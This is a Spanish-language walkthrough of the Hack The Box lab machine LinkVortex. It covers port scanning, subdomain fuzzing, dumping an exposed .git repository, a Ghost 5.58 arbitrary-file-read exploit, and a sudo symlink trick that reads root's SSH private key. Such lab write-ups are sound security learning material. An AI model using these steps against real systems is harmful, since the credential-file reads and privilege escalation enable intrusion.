---
title: HTB LinkVortex Writeup
date: 2025-04-19 10:45:00 -05:00
author: retxus
categories: [HTB, Linux]
tags: [Linux, http, Arbitrary File Read, Information Leakage, Sumlinks - Read files, Exposure .git]
comments: false
image:
  path: /assets/img/HTB-LinkVortex/LinkVortex.png
---

Muy buenas con todos, el día de hoy voy a resolver la máquina `LinkVortex` de HTB, espero que el procedimiento sea de su agrado y fácil de comprender.

## Reconocimiento

Primero vemos si tenemos conexión con la máquina y, de paso, gracias al `ttl` identificamos ante el tipo de máquina que estamos, en `linux` este suele ser de 64 y en `windows` de 128.

```bash
ping -c 1 10.10.11.47
PING 10.10.11.47 (10.10.11.47) 56(84) bytes of data.
64 bytes from 10.10.11.47: icmp_seq=1 ttl=63 time=107 ms

--- 10.10.11.47 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 106.759/106.759/106.759/0.000 ms
```

Vemos que el `ttl` de la máquina es de `63`, el cual está próximo a `64` por ende nos encontramos ante una máquina `Linux`.

Ahora vamos a identificar los puertos abiertos dentro de la máquina, los invito a usar el siguiente `script` hecho en `bash`.

```bash
#!/bin/bash

GREEN="\e[32m"
RED="\e[31m"
RESET="\e[0m"

IP="$1"

if [ -z "$IP" ]; then
  echo "Uso: $0 <IP>"
  exit 1
fi

TEMP_FILE=$(mktemp)

echo -e "${GREEN}[+] Escaneando todos los puertos abiertos... ${RESET}"

nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn "$IP" -oG "$TEMP_FILE"

# Extraer los puertos abiertos
PORTS=$(grep -oP '\d+/open' "$TEMP_FILE" | awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//'; echo)

rm "$TEMP_FILE"

if [ -z "$PORTS" ]; then
  echo -e "${RED}[-] No se encontraron puertos abiertos.${RESET}"
  exit 1
fi

echo -e "\n${GREEN}[+] Escanenado servicios en los puertos: $PORTS. ${RESET}\n"

nmap -sCV -p"$PORTS" "$IP" -oN target

echo -e "\n${GREEN}[+] Escano completado. Resultados en 'target'.${RESET}\n"
```

De preferencia es mejor usar este `script` como `root`, ya que algunos parámetros de `nmap`, requieren de privilegios elevados. Esto al final nos va a generar un archivo `target` que contiene la información de los puertos abiertos dentro de la máquina.

```bash
sudo ./scan.sh 10.10.11.44
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to http://linkvortex.htb/
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos que tenemos el puerto `22 - ssh` y `80 - http`, vemos que en el servidor `web` se aplica `resolución DNS`, y por ende nuestra máquina no sabe qué es `linkvortex.htb`, así que lo agregamos al `/etc/hosts`, para que sepa dónde resolver

```bash
127.0.0.1   localhost
::1     localhost
127.0.0.1   machinename.localhost   machinename
10.10.11.47    linkvortex.htb
```

### Analizando la web

Si vemos la `web` tenemos lo que parece ser un sistema para crear `blogs`. Vemos qué como `CMS` usa `ghost` y se nos muestra la versión (5.58). Hay una vulnerabilidad asociada a esa versión, pero se necesitan credenciales y por el momento no tenemos. En `http://linkvortex.htb/ghost` tenemos un apartado para iniciar sesión, pero no parece ser vulnerable.

Sin embargo, como hay un botón para restablecer la contraseña, podríamos probar usuarios que sean válidos; uno de ellos, por ejemplo, es `admin@linkvortex.htb`

### Enumeración de subdominios

Vamos a ver si logramos encontrar algún subdominio asociado a la `web`.

```bash
ffuf -c -t 100 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "HOST: FUZZ.linkvortex.htb" -u http://linkvortex.htb/ -fl 8
```

Logramos obtener uno `dev.linkvortex.htb`, así que lo agregamos al `/etc/passwd` para ver qué contiene. El sitio no tiene nada fuera de lo común, pero si buscamos directorios encontramos un `.git`.

## Dumpear .git

Para traer el proyecto `.git` a nuestra máquina, podemos hacer uso de [GitHack](https://github.com/lijiejie/GitHack.git){:target="_blank"}.

```bash
python GitHack.py http://dev.linkvortex.htb/.git
```

Nos trajo lo que parece ser el proyecto de la `web` principal, hay un archivo, `Dockerfile.ghost` por ende aquí podemos asumir que el servidor `web` está corriendo en un contenedor.

## Fuga de información

Algo interesante en el archivo de `docker` es que se muestra la ruta de un archivo de configuración que está en formato `json`. Si lo podríamos ver sería interesante. También en `/dev.linkvortex.htb/ghost/core/test/regression/api/admin`, tenemos un archivo `.js` y dentro lo que parece ser una credencial.

![](/assets/img/HTB-LinkVortex/1_LinkVortex.png)

Podríamos tratar de autenticarnos haciendo uso de esa credencial como, `admin` en `http://linkvortex.htb/ghost`, vemos que es posible. Indagando por la página no vemos nada interesante; sin embargo, recordemos que para la versión de `ghost` que están usando hay una vulnerabilidad de tipo `Arbitrary File Read`.

## Arbitrary File Read

Buscando un poco me encuentro con [esto](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028){:target="_blank"}. Básicamente, lo que hace el `script`, es autenticarse en la `web`, luego crea un archivo `.zip` que contiene un link simbólico, que apunta al archivo que nosotros queremos ver. Para hacer uso del `script`, debemos cambiar un par de líneas en el código, en `$GHOST_URL/ghost/api/v3/admin/` eliminamos `v3` quedando así `$GHOST_URL/ghost/api/admin/`, y eliminamos la cabecera `-H "Accept-Version: v3.0" \`. Luego vamos a ver si logramos leer archivos.

![](/assets/img/HTB-LinkVortex/2_LinkVortex.png)

Vemos que podemos leer archivos de la máquina. Viendo ese archivo `/etc/passwd`, ya podemos estar más seguros de que estamos ante un contenedor. Bueno, podríamos tratar de leer el `.json` que se muestra en el `Dockerfile`.

## Ganando acceso

Vemos que se pudo. Algo interesante aquí, es que se muestra un usuario y su credencial.

![](/assets/img/HTB-LinkVortex/3_LinkVortex.png)

Haciendo uso de esa credencial, tratamos de autenticarnos por `ssh` con ese usuario y vemos que se pudo y logramos ver la primera parte de la máquina.

![](/assets/img/HTB-LinkVortex/4_LinkVortex.png)

## Escalada de privilegios

El usuario en cuestión, dispone de cierto privilegio a nivel de `root`, puede ejecutar un `script` escrito en `bash`. Básicamente, lo que hace es que cuando le pasamos una foto en formato `.png`, y este apunta a un link simbólico, siempre que `CHECK_CONTENT` esté en `true` y que en link simbólico no apunte a `/etc` o `/root`, este nos mostrará su contenido.

Bueno algo que se puede hacer para saltarnos estas restricciones es setear de antes `CHECK_CONTENT` a `true`, ya que por defecto está en `false` y hacer que el link simbólico apunte a otra ruta de forma enmascarada. Primero creamos un link simbólico que apunte a la `id_rsa` de `root`

```bash
ln -s -f /root/.ssh/id_rsa evil.txt
```

Luego otro link simbólico que apunte a ese archivo `evil.txt`

```bash
ln -s -f /home/bob/evil.txt evil.png
```

Por último seteando `CHECK_CONTENT` a `true` vemos el contenido de la imagen.

```bash
CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh evil.png
```

Y ya guardamos esa clave en un archivo `id_rsa` le damos el permiso `600`, nos conectamos como `root` a la máquina y vemos la última parte.

![](/assets/img/HTB-LinkVortex/5_LinkVortex.png)
